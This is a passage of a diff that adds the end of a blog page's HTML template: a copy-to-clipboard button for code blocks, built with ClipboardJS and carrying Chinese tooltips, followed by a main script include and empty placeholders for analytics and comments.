+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
